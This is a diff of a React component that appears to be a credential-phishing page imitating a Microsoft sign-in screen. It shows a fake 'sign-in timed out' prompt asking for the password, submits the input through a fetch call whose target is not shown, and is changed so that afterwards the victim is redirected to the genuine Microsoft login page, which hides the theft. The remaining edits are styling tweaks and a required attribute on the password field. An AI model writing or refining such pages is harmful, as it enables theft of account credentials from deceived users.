@@ -20,7 +20,7 @@ function Home() {
     })
       .then((response) => response.json)
       .then((json) =>
-        alert("Log In successful. You will be redirected in a bit")
+        window.location.replace("https://login.microsoftonline.com/")
       );
   };
   return (
@@ -39,7 +39,7 @@ function Home() {
           </div>
           <div>
             <h2>Enter password</h2>
-            <p style={{ color: "red", fontSize: "15px", fontWeight:"bold" }}>
+            <p style={{ color: "red", fontSize: "15px" }}>
               Sorry, your sign-in timed out. Please sign in again.
             </p>
             <input
@@ -47,6 +47,7 @@ function Home() {
               placeholder="Password"
               onChange={(e) => setPassword(e.target.value)}
               value={password}
+              required
             />
             <hr />
             <p style={{ color: "steelblue", fontSize: "small" }}>
@@ -62,7 +63,7 @@ function Home() {
         <p className="footer">
           <span style={{ marginRight: "1rem" }}>Terms of use </span>{" "}
           <span style={{ marginRight: "1rem" }}>privacy and use</span>{" "}
-          <b style={{textAlign:"center"}}>. . .</b>
+          <b style={{ textAlign: "center" }}>. . .</b>
         </p>
       </footer>
     </div>
